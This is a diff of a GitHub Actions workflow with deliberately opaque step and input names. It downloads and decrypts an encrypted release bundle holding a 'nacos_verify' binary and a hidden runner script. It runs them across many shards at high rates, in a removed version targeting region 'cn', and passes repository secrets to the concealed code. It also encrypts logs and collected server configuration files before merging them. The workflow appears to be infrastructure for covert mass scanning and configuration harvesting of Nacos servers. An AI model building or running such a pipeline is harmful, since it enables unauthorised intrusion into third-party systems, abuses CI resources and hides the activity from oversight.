@@ -3,15 +3,9 @@ on:
   workflow_dispatch:
     inputs:
       a:
-        default: '500000'
-      b:
-        default: '200'
-      c:
         default: '40'
-      d:
-        default: 'cn'
-      e:
-        default: '0'
+      b:
+        default: '150'
 
 jobs:
   run:
@@ -26,28 +20,35 @@ jobs:
     steps:
       - name: s0
         run: |
-          curl -sL \
+          RELEASE=$(curl -sL \
             -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-            -H "Accept: application/octet-stream" \
-            "$(curl -sL \
-              -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-              "https://api.github.com/repos/${{ github.repository }}/releases/latest" \
-              | python3 -c "import sys,json; a=json.load(sys.stdin)['assets']; print(next(x['url'] for x in a if x['name']=='bundle.enc'))")" \
-            -o b.enc
+            "https://api.github.com/repos/${{ github.repository }}/releases/latest")
+
+          get_url() {
+            echo "$RELEASE" | python3 -c \
+              "import sys,json; a=json.load(sys.stdin)['assets']; print(next(x['url'] for x in a if x['name']=='$1'))"
+          }
+
+          BUNDLE_URL=$(get_url bundle.enc)
+          COMBINE_URL=$(get_url combine.enc)
+
+          curl -sL -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/octet-stream" "$BUNDLE_URL" -o b.enc
           openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 \
-            -in b.enc -k "${{ secrets.SCAN_KEY }}" \
-            | tar xz -C /tmp
+            -in b.enc -k "${{ secrets.SCAN_KEY }}" | tar xz -C /tmp
           chmod +x /tmp/nacos_verify_linux
           mv /tmp/nacos_verify_linux /tmp/nacos_verify
-          rm -f b.enc
+          rm b.enc
+
+          echo "COMBINE_URL=$COMBINE_URL" >> $GITHUB_ENV
 
       - name: s1
         run: |
           export SHARD_ID="${{ matrix.i }}"
-          export TOTAL_SHARDS="${{ inputs.c }}"
-          export REGION="${{ inputs.d }}"
-          export RATE="${{ inputs.a }}"
-          export THREADS="${{ inputs.b }}"
+          export TOTAL_SHARDS="${{ inputs.a }}"
+          export GH_TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          export SCAN_KEY="${{ secrets.SCAN_KEY }}"
+          export ASSET_URL_COMBINE="${COMBINE_URL}"
           bash /tmp/runner.sh 2>&1 \
             | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 \
                 -out /tmp/run.log.enc \
@@ -56,15 +57,10 @@ jobs:
       - name: s2
         if: always()
         run: |
-          OUT=""
-          [ -f /tmp/results.tar.gz ] && OUT="/tmp/results.tar.gz"
-          [ -f /tmp/run.log.enc ]    && OUT="$OUT /tmp/run.log.enc"
-          if [ -n "$OUT" ]; then
-            tar czf - $OUT 2>/dev/null \
-              | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 \
-                  -out shard_${{ matrix.i }}.enc \
-                  -k "${{ secrets.SCAN_KEY }}"
-          fi
+          tar czf - /tmp/results.tar.gz /tmp/run.log.enc 2>/dev/null \
+            | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 \
+                -out shard_${{ matrix.i }}.enc \
+                -k "${{ secrets.SCAN_KEY }}" || true
 
       - uses: actions/upload-artifact@v4
         if: always()
@@ -85,21 +81,22 @@ jobs:
 
       - name: s0
         run: |
-          mkdir -p merged
+          mkdir -p merged/configs
           for enc in *.enc; do
+            DIR="/tmp/p_${enc}"
+            mkdir -p "$DIR"
             openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 \
               -in "$enc" -k "${{ secrets.SCAN_KEY }}" \
-              | tar xz -C /tmp/piece_$enc/ 2>/dev/null || true
+              | tar xz -C "$DIR" 2>/dev/null || true
           done
           find /tmp -name 'report.ndjson' -exec cat {} + \
             | sort -u > merged/report.ndjson 2>/dev/null || true
-          find /tmp -path '*/out/configs/*' -not -type d \
-            | while read f; do
-                rel="${f#*/out/configs/}"
-                dst="merged/configs/$rel"
-                mkdir -p "$(dirname "$dst")"
-                cp -n "$f" "$dst" 2>/dev/null || true
-              done
+          find /tmp -path '*/out/configs/*' -not -type d | while read f; do
+            rel="${f#*/out/configs/}"
+            dst="merged/configs/$rel"
+            mkdir -p "$(dirname "$dst")"
+            cp -n "$f" "$dst" 2>/dev/null || true
+          done
           tar czf - merged/ \
             | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 \
                 -out final_${{ github.run_id }}.enc \
